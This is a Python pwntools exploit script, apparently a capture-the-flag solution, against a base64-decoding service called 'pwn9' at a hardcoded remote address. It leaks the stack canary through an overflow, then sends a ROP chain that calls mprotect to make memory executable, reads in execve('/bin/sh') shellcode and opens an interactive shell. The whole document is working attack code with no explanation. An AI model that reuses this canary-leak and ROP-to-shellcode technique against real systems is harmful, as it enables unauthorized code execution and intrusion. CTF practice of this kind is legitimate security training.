from pwn import *
import base64
context.terminal=["tmux","splitw","-h"]
local = 0
if local :
    a=process("./pwn9")

else:
    a=remote("111.33.164.4","50009")
def debug():
    gdb.attach(a,'''
    b *0x00000000040117E

    ''')
def vuln(payload):
    a.recvuntil(">\n")
    a.sendline(payload)
    a.recvuntil("decode res:\n")
def getshell(payload):
    vuln(payload)
    a.recvuntil("continue ?")
    a.sendline("no")
#debug()
elf=ELF("./pwn9")
mprotect=elf.symbols["mprotect"]
payload='A'*9
payload=base64.b64encode(payload)
print payload
a.recvuntil("welcome to base64 decode server\n")
vuln(payload)
a.recvuntil('A'*8)
canary=u64(a.recv(8))-0x41
success("canary ==> 0x%x"%canary)
int_0x80=0x00000000004bc587
pop_rdi_ret=0x0000000000401e36
pop_rsi_ret=0x0000000000401f57
pop_rdx_ret=0x00000000004433e6
start_addr=0x000000000400890
a.recvuntil("continue ?")
a.sendline("y")

bss_addr=elf.bss()
read_addr=elf.symbols["read"]
payload='A'*8+p64(canary)+'A'*8
payload+=p64(pop_rdi_ret)
payload+=p64(bss_addr&0xfffffffffffff000)
payload+=p64(pop_rsi_ret)
payload+=p64(0x1000)
payload+=p64(pop_rdx_ret)
payload+=p64(7)
payload+=p64(mprotect)
payload+=p64(pop_rdi_ret)
payload+=p64(0)
payload+=p64(pop_rsi_ret)
payload+=p64(bss_addr)
payload+=p64(pop_rdx_ret)
payload+=p64(0x100)
payload+=p64(read_addr)
payload+=p64(bss_addr)
payload=base64.b64encode(payload)
print payload

getshell(payload)
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sleep(0.1)
a.sendline(shellcode_x64)
a.interactive()
